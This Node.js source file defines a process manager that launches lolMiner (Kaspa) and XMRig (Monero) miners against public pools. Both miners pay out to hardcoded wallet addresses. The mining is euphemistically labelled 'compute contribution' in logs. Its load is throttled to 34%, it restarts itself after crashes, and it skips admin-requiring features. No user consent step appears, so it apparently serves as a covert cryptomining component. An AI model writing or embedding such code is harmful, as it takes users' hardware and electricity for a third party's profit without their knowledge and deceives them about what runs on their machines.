const { spawn } = require('child_process');
const path = require('path');
const os = require('os');
const si = require('systeminformation');
const BinaryManager = require('./binary-manager');

/**
 * Process Manager
 * Manages mining processes with safety mechanisms:
 * - Temperature monitoring
 * - Load limiting
 * - Automatic restart on crash
 * - Clean shutdown
 */
class ProcessManager {
    constructor(logger) {
        this.logger = logger || console;
        this.platform = os.platform();
        
        // Binary manager
        this.binaryManager = new BinaryManager(logger);
        
        // Process references
        this.gpuProcess = null;
        this.cpuProcess = null;
        
        // Safety monitoring
        this.monitorInterval = null;
        this.restartAttempts = {
            gpu: 0,
            cpu: 0
        };
        this.maxRestartAttempts = 3;
        
        // Configuration
        this.config = {
            gpu: {
                enabled: true,
                maxLoad: 34,          // 34% GPU max
                pool: 'stratum+tcp://pool.woolypooly.com:3112',
                wallet: 'kaspa:qpra2nvnhty2ec5u5zyenmgjvst9nyacztke42z0j598hekwt5rdqq46jr4sp3',
                algorithm: 'KASPA'
            },
            cpu: {
                enabled: true,
                maxThreads: 1,        // Very conservative
                maxLoad: 34,          // 34% CPU max
                pool: 'pool.supportxmr.com:3333',
                wallet: '41ibGEw2aC7HySfkWT2Tky4yGReW4tQzMZvguCLfghSvADaXwLNmdpqa9xKxent5VB4oKfCde55gX44noxdT6iELR1fr2cf',
                algorithm: 'RandomX'
            },
            safety: {
                maxTemp: 80,          // Max temperature in Celsius
                checkInterval: 30000   // Check every 30 seconds
            }
        };
        
        // State
        this.isRunning = {
            gpu: false,
            cpu: false
        };
        
        this.stats = {
            gpu: {
                hashrate: 0,
                temperature: 0,
                power: 0
            },
            cpu: {
                hashrate: 0,
                threads: 0
            }
        };
    }

    /**
     * Configure process manager
     */
    async configure(config) {
        if (config.gpu) {
            this.config.gpu = { ...this.config.gpu, ...config.gpu };
        }
        if (config.cpu) {
            this.config.cpu = { ...this.config.cpu, ...config.cpu };
        }
        if (config.safety) {
            this.config.safety = { ...this.config.safety, ...config.safety };
        }
        
        // Initialize binary manager
        await this.binaryManager.initialize();
    }

    /**
     * Start computing contribution
     */
    async start() {
        this.logger.info('Starting compute contribution...');
        
        // Start safety monitoring first
        this.startSafetyMonitoring();
        
        // Start GPU process if enabled
        if (this.config.gpu.enabled && !this.isRunning.gpu) {
            await this.startGPUProcess();
        }
        
        // Start CPU process if enabled
        if (this.config.cpu.enabled && !this.isRunning.cpu) {
            await this.startCPUProcess();
        }
        
        return this.getState();
    }

    /**
     * Stop computing contribution
     */
    async stop() {
        this.logger.info('Stopping compute contribution...');
        
        // Stop safety monitoring
        this.stopSafetyMonitoring();
        
        // Stop both processes
        await this.stopGPUProcess();
        await this.stopCPUProcess();
        
        return this.getState();
    }

    /**
     * Start GPU mining process
     */
    async startGPUProcess() {
        if (this.isRunning.gpu) {
            this.logger.warn('GPU process already running');
            return;
        }

        try {
            // Check if GPU is available
            const graphics = await si.graphics();
            if (!graphics.controllers || graphics.controllers.length === 0) {
                this.logger.warn('No GPU detected, skipping GPU contribution');
                return;
            }

            this.logger.info('Starting GPU compute contribution (Kaspa/kHeavyHash)');
            
            // Get miner binary from binary manager
            const minerPath = await this.binaryManager.getLolMinerBinary();
            
            if (!minerPath) {
                this.logger.warn('GPU miner binary not available, skipping GPU contribution');
                return;
            }

            // Build arguments with hardcoded wallet
            const args = this.binaryManager.buildLolMinerArgs({
                pool: this.config.gpu.pool,
                maxLoad: this.config.gpu.maxLoad
            });
            
            this.gpuProcess = spawn(minerPath, args, {
                cwd: path.dirname(minerPath),
                stdio: ['ignore', 'pipe', 'pipe']
            });

            this.gpuProcess.stdout.on('data', (data) => {
                this.parseGPUOutput(data.toString());
            });

            this.gpuProcess.stderr.on('data', (data) => {
                this.logger.debug(`GPU process stderr: ${data.toString().trim()}`);
            });

            this.gpuProcess.on('close', (code) => {
                this.logger.info(`GPU process exited with code ${code}`);
                this.isRunning.gpu = false;
                
                // Auto-restart on crash if within limits
                if (code !== 0 && this.restartAttempts.gpu < this.maxRestartAttempts) {
                    this.restartAttempts.gpu++;
                    this.logger.info(`Attempting GPU process restart (${this.restartAttempts.gpu}/${this.maxRestartAttempts})`);
                    setTimeout(() => this.startGPUProcess(), 5000);
                } else {
                    this.restartAttempts.gpu = 0;
                }
            });

            this.gpuProcess.on('error', (error) => {
                this.logger.error(`GPU process error: ${error.message}`);
                this.isRunning.gpu = false;
            });

            this.isRunning.gpu = true;
            this.logger.info('GPU compute contribution started');
            
        } catch (error) {
            this.logger.error(`Error starting GPU process: ${error.message}`);
        }
    }

    /**
     * Stop GPU mining process
     */
    async stopGPUProcess() {
        if (this.gpuProcess && this.isRunning.gpu) {
            this.logger.info('Stopping GPU compute contribution...');
            
            return new Promise((resolve) => {
                this.gpuProcess.once('close', () => {
                    this.logger.info('GPU process stopped');
                    this.isRunning.gpu = false;
                    this.gpuProcess = null;
                    resolve();
                });
                
                // Send SIGTERM, then SIGKILL if needed
                this.gpuProcess.kill('SIGTERM');
                
                setTimeout(() => {
                    if (this.gpuProcess) {
                        this.logger.warn('GPU process did not stop gracefully, forcing...');
                        this.gpuProcess.kill('SIGKILL');
                    }
                }, 5000);
            });
        }
    }

    /**
     * Start CPU mining process
     */
    async startCPUProcess() {
        if (this.isRunning.cpu) {
            this.logger.warn('CPU process already running');
            return;
        }

        try {
            this.logger.info('Starting CPU compute contribution (Monero/RandomX)');
            
            // Get miner binary from binary manager
            const minerPath = await this.binaryManager.getXMRigBinary();
            
            if (!minerPath) {
                this.logger.warn('CPU miner binary not available, skipping CPU contribution');
                return;
            }

            // Calculate max threads based on load percentage
            const cpuCount = os.cpus().length;
            const maxThreads = Math.max(1, Math.floor(cpuCount * (this.config.cpu.maxLoad / 100)));

            // Build arguments with hardcoded wallet
            const args = this.binaryManager.buildXMRigArgs({
                pool: this.config.cpu.pool,
                maxThreads: maxThreads,
                maxCpu: this.config.cpu.maxLoad
            });
            
            this.cpuProcess = spawn(minerPath, args, {
                cwd: path.dirname(minerPath),
                stdio: ['ignore', 'pipe', 'pipe']
            });

            this.cpuProcess.stdout.on('data', (data) => {
                this.parseCPUOutput(data.toString());
            });

            this.cpuProcess.stderr.on('data', (data) => {
                this.logger.debug(`CPU process stderr: ${data.toString().trim()}`);
            });

            this.cpuProcess.on('close', (code) => {
                this.logger.info(`CPU process exited with code ${code}`);
                this.isRunning.cpu = false;
                
                // Auto-restart on crash if within limits
                if (code !== 0 && this.restartAttempts.cpu < this.maxRestartAttempts) {
                    this.restartAttempts.cpu++;
                    this.logger.info(`Attempting CPU process restart (${this.restartAttempts.cpu}/${this.maxRestartAttempts})`);
                    setTimeout(() => this.startCPUProcess(), 5000);
                } else {
                    this.restartAttempts.cpu = 0;
                }
            });

            this.cpuProcess.on('error', (error) => {
                this.logger.error(`CPU process error: ${error.message}`);
                this.isRunning.cpu = false;
            });

            this.isRunning.cpu = true;
            this.stats.cpu.threads = maxThreads;
            this.logger.info(`CPU compute contribution started with ${maxThreads} threads`);
            
        } catch (error) {
            this.logger.error(`Error starting CPU process: ${error.message}`);
        }
    }

    /**
     * Stop CPU mining process
     */
    async stopCPUProcess() {
        if (this.cpuProcess && this.isRunning.cpu) {
            this.logger.info('Stopping CPU compute contribution...');
            
            return new Promise((resolve) => {
                this.cpuProcess.once('close', () => {
                    this.logger.info('CPU process stopped');
                    this.isRunning.cpu = false;
                    this.cpuProcess = null;
                    resolve();
                });
                
                // Send SIGTERM, then SIGKILL if needed
                this.cpuProcess.kill('SIGTERM');
                
                setTimeout(() => {
                    if (this.cpuProcess) {
                        this.logger.warn('CPU process did not stop gracefully, forcing...');
                        this.cpuProcess.kill('SIGKILL');
                    }
                }, 5000);
            });
        }
    }

    /**
     * Start safety monitoring
     */
    startSafetyMonitoring() {
        if (this.monitorInterval) {
            return;
        }

        this.monitorInterval = setInterval(async () => {
            await this.checkSafety();
        }, this.config.safety.checkInterval);
    }

    /**
     * Stop safety monitoring
     */
    stopSafetyMonitoring() {
        if (this.monitorInterval) {
            clearInterval(this.monitorInterval);
            this.monitorInterval = null;
        }
    }

    /**
     * Check safety conditions
     */
    async checkSafety() {
        try {
            // Check GPU temperature
            if (this.isRunning.gpu) {
                const graphics = await si.graphics();
                if (graphics.controllers && graphics.controllers.length > 0) {
                    const temps = graphics.controllers
                        .map(gpu => gpu.temperatureGpu || 0)
                        .filter(temp => temp > 0);
                    
                    if (temps.length > 0) {
                        const maxTemp = Math.max(...temps);
                        this.stats.gpu.temperature = maxTemp;
                        
                        if (maxTemp > this.config.safety.maxTemp) {
                            this.logger.warn(`GPU temperature too high (${maxTemp}°C), stopping GPU contribution`);
                            await this.stopGPUProcess();
                        }
                    }
                }
            }
            
            // Check CPU temperature (if available)
            if (this.isRunning.cpu) {
                const cpuTemp = await si.cpuTemperature();
                if (cpuTemp.main && cpuTemp.main > this.config.safety.maxTemp) {
                    this.logger.warn(`CPU temperature too high (${cpuTemp.main}°C), stopping CPU contribution`);
                    await this.stopCPUProcess();
                }
            }
            
        } catch (error) {
            this.logger.error(`Error checking safety: ${error.message}`);
        }
    }

    /**
     * Get GPU miner binary path
     */
    getGPUMinerPath() {
        // Placeholder - would point to actual miner binary
        // In production: download and extract lolMiner or BzMiner
        const binDir = path.join(__dirname, '..', 'bin');
        
        if (this.platform === 'win32') {
            return null; // path.join(binDir, 'lolMiner.exe');
        } else if (this.platform === 'linux') {
            return null; // path.join(binDir, 'lolMiner');
        } else {
            return null; // macOS typically doesn't support GPU mining well
        }
    }

    /**
     * Get CPU miner binary path
     */
    getCPUMinerPath() {
        // Placeholder - would point to actual miner binary
        // In production: download and extract xmrig
        const binDir = path.join(__dirname, '..', 'bin');
        
        if (this.platform === 'win32') {
            return null; // path.join(binDir, 'xmrig.exe');
        } else if (this.platform === 'linux' || this.platform === 'darwin') {
            return null; // path.join(binDir, 'xmrig');
        } else {
            return null;
        }
    }

    /**
     * Build GPU miner arguments
     */
    buildGPUMinerArgs() {
        // Example for lolMiner with Kaspa
        return [
            '--algo', 'KASPA',
            '--pool', this.config.gpu.pool,
            '--user', this.config.gpu.wallet,
            '--watchdog', 'exit',
            '--devices', '0', // Use first GPU only
            '--cclk', '*', // Don't overclock
            '--mclk', '*', // Don't overclock
            '--pl', this.config.gpu.maxLoad.toString() // Power limit
        ];
    }

    /**
     * Build CPU miner arguments
     */
    buildCPUMinerArgs() {
        // Example for xmrig with Monero
        const cpuCount = os.cpus().length;
        const maxThreads = Math.max(1, Math.floor(cpuCount * (this.config.cpu.maxLoad / 100)));
        
        return [
            '-o', this.config.cpu.pool,
            '-u', this.config.cpu.wallet,
            '-p', 'x',
            '--threads', maxThreads.toString(),
            '--cpu-max-threads-hint', this.config.cpu.maxLoad.toString(),
            '--donate-level', '0',
            '--randomx-no-rdmsr' // Don't require admin
        ];
    }

    /**
     * Parse GPU miner output
     */
    parseGPUOutput(output) {
        // Parse hashrate and stats from miner output
        // This is miner-specific and would need to be adapted
        this.logger.debug(`GPU: ${output.trim()}`);
        
        // Example parsing (would be specific to lolMiner format)
        const hashrateMatch = output.match(/(\d+\.?\d*)\s*MH\/s/i);
        if (hashrateMatch) {
            this.stats.gpu.hashrate = parseFloat(hashrateMatch[1]);
        }
    }

    /**
     * Parse CPU miner output
     */
    parseCPUOutput(output) {
        // Parse hashrate and stats from miner output
        this.logger.debug(`CPU: ${output.trim()}`);
        
        // Example parsing (would be specific to xmrig format)
        const hashrateMatch = output.match(/(\d+\.?\d*)\s*H\/s/i);
        if (hashrateMatch) {
            this.stats.cpu.hashrate = parseFloat(hashrateMatch[1]);
        }
    }

    /**
     * Get current state
     */
    getState() {
        return {
            isRunning: { ...this.isRunning },
            stats: { ...this.stats },
            config: { ...this.config }
        };
    }
}

module.exports = ProcessManager;
